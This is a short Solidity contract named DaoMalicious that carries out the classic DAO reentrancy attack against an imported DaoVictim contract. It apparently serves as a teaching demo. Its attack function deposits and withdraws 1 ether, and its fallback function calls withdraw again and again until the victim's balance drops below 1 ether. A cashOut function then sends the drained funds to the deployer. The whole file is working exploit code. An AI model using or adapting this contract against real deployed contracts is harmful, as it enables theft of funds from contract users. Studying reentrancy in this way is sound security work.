//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.8;

import "./DaoVictim.sol";

contract DaoMalicious {
    DaoVictim public victim;
    address payable _owner;
    
    constructor(address _addr) public {
        victim = DaoVictim(_addr);
    _owner = msg.sender;
    }
    
    fallback() external payable {
        if(address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    } 
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
 
    function cashOut() external payable {
    _owner.transfer(address(this).balance);
    }
}
